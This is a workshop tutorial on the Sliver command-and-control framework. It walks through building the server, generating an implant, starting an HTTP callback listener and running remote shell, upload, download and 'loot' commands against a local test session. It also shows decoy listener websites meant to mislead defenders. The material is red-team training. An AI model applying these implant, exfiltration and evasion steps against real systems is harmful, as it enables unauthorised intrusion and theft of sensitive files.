# Getting Started

You can start using Sliver immediately by downloading a release binary for your specific operating system/architecture from the Sliver Github page:
[https://github.com/BishopFox/sliver/releases](https://github.com/BishopFox/sliver/releases)

`sliver-server` is the binary you want to use to run the Sliver C2 server, `sliver-client` is solely a client to connect to a Sliver C2 server. Sliver server also acts as a client on its own, so you don’t necessarily run sliver server and client separately.

For this workshop we recommend building Sliver manually if you are running macOS or Linux, otherwise feel free to take a pre-build release. This will be helpful if you want to do any modification to the source code and perhaps even contribute. Clone the Sliver repository and use the `make` command to build Sliver.

One prerequisite will be that you have a recent Golang version installed ([https://go.dev/doc/install](https://go.dev/doc/install)).

```bash
git clone git@github.com:BishopFox/sliver.git
cd sliver
make
```

First time building Sliver takes more time as its retrieving many dependencies, consecutive builds will be much faster. Once the build is completed, go ahead and launch the `sliver-server`.

```
$ ./sliver-server 

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain exalted
[*] Server v1.5.37 - d92aaa98e4ea5c318792dfcf112911f7fe121089
[*] Welcome to the sliver shell, please type 'help' for options

[server] sliver >
```

Now that Sliver is running, generate your first implant going to try out some of the basic features of Sliver, for now we’re going to run everything on the local host we will switch to a lab environment later on.

First generate your implant using the `generate` command as shown below.

```bash
[server] sliver > generate -b localhost --debug --skip-symbols --os macos
[] *Generating new darwin/amd64 implant binary*
[] **Build completed in 4s
[*] Implant saved to /Users/tester/tools/RELATED_EARDRUM
```

In my case the local system is macOS, remember to adapt the `os` flag.`skip-symbols` will skip some of the obfuscation used during implant generation and `debug` display some additional information while the implant is running.

Next you will need to spin up a listener for our implant to be able to connect back to, sliver supports using mTLS, HTTP/S, DNS and WireGuard but for now we’re going to stick to HTTP.

```bash
[server] sliver > http
[] *Starting HTTP :80 listener ...*
[] Successfully started job #1
```

A HTTP listener is now running and if you want to verify which listeners are currently running you can use the `jobs` command:

```html
[server] sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 1    http   tcp        80
```

Finally run the implant in a separate window and watch it connect back to the sliver server.

```bash
[*] Session 1884a365 RELATED_EARDRUM - [::1]:49153 (test.local) - darwin/amd64
```

Now let’s select our implant and run our first command using the `use` command.

```bash
[server] sliver > use
? Select a session or beacon: 
SESSION  1884a365  RELATED_EARDRUM  [::1]:49153      test.local  tester  darwin/amd64
[*] Active session RELATED_EARDRUM (1884a365-085f-4506-b28e-80c481730fd0)

[server] sliver (RELATED_EARDRUM) > pwd

[*] /Users/tester/tools
```

Once you have reached this point, go ahead and explore some of the commands listed below. In each case first checkout the commands help using the **`-h`** flag then try it out!

Exploring and interacting with the filesystem

- ls / cd / pwd / mv / rm / cat / mkdir

Getting some environmental information

- ps / getuid / getpid / getprivs/ getgid / env

Uploading and downloading files

- upload / download

Execute a binary

- execute

Running an interactive shell

- shell

Rename a session

- rename

View and kill running listeners

- jobs

## Loot

Certain commands such as execute or download have a `loot` flag which will store command output or the file being downloaded on the sliver server. This can be handy to store sensitive files or large command outputs. The contents of this store can then be viewed using the loot command.

```bash
[server] sliver (TIRED_GIRAFFE) > execute --loot pwd

[*] Tasked beacon TIRED_GIRAFFE (8972b121)

[+] TIRED_GIRAFFE completed task 8972b121

[*] Successfully looted execute_test.local_pwd_20230424233646.log ([execute] pwd on test.local (20230424233646)) (ID: 4442b117-136c-4736-bf05-c36904360999)
[*] Command executed successfully

[server] sliver (TIRED_GIRAFFE) > loot

Type  Name                                                      File Name                                              UUID
====  ====                                                      =========                                              ====
File  [execute] pwd on test.local (20230424233646)  test.local_pwd_20230424233646.log  4442b117-136c-4736-bf05-c36904360999

[server] sliver (TIRED_GIRAFFE) > loot fetch

? Select a piece of loot: [execute] pwd on test.local (20230424233646)  execute_test.local_pwd_20230424233646.log  LOOT_FILE  4442b117-136c-4736-bf05-c36904360999

File Name: execute_test.local_pwd_20230424233646.log

Output (stdout):
/Users/test
```

## Sliver websites

Websites are used to add another layer of obfuscation in your listeners, the idea is to host static content on your listener url that should be retrieved by curious blue teamers and hopefully help you seem more legitimate.

Let’s do a basic example using a simple html page to illustrate this, save the content below to a local file.

```html
<!DOCTYPE html>
<html>
<header>
	<title>It works !</title>
</header>
<body>
	<h1>It works !</h1>
</body>
</html>
```

Next we will create our website using the `websites` command.

```bash
server] sliver > websites add-content --website apache --web-path / --content basic.html

[*] apache

 Path   Content-Type               Size
====== ========================== ======
 /      text/html; charset=utf-8    113

[server] sliver > websites

Websites
========
apache - 1 page(s)

[server] sliver > websites add-content --website apache --web-path /index.html --content basic.html

[*] apache

 Path          Content-Type               Size
============= ========================== ======
 /             text/html; charset=utf-8    113
 /index.html   text/html; charset=utf-8    113
```

In our case we are hosting content at the website’s root, / and at /index.html. Next we will spin up a new http listener using our website.

```bash
[server] sliver > http -w apache

[*] Starting HTTP :80 listener ...
[*] Successfully started job #2
```

If we now attempt to query our listener we should be seeing static content at the urls we configured.

```bash
tester@test ~/tools> curl http://localhost:80/
<!DOCTYPE html>
<html>
<header>
	<title>It works !</title>
</header>
<body>
	<h1>It works !</h1>
</body>
</html>

tester@test ~/tools> curl http://localhost:80/index.html
<!DOCTYPE html>
<html>
<header>
	<title>It works !</title>
</header>
<body>
	<h1>It works !</h1>
</body>
</html>

tester@test ~/tools> curl http://localhost:80/123 -vv
*   Trying 127.0.0.1:80...
* Connected to localhost (127.0.0.1) port 80 (#0)
> GET /123 HTTP/1.1
> Host: localhost
> User-Agent: curl/7.86.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Cache-Control: no-store, no-cache, must-revalidate
< Date: Thu, 04 May 2023 20:13:23 GMT
< Content-Length: 0
<
* Connection #0 to host localhost left intact
```

As shown above, if the url matches one of our pre-configured url’s the websites static content will be served, otherwise if sliver does not recognise the traffic it will default to a 404 not found.

## References

- [https://github.com/BishopFox/sliver/wiki/Beginner's-Guide](https://github.com/BishopFox/sliver/wiki/Beginner's-Guide)
- [https://github.com/BishopFox/sliver/wiki/Getting-Started](https://github.com/BishopFox/sliver/wiki/Getting-Started)
- [https://github.com/BishopFox/sliver/wiki/Loot](https://github.com/BishopFox/sliver/wiki/Loot)
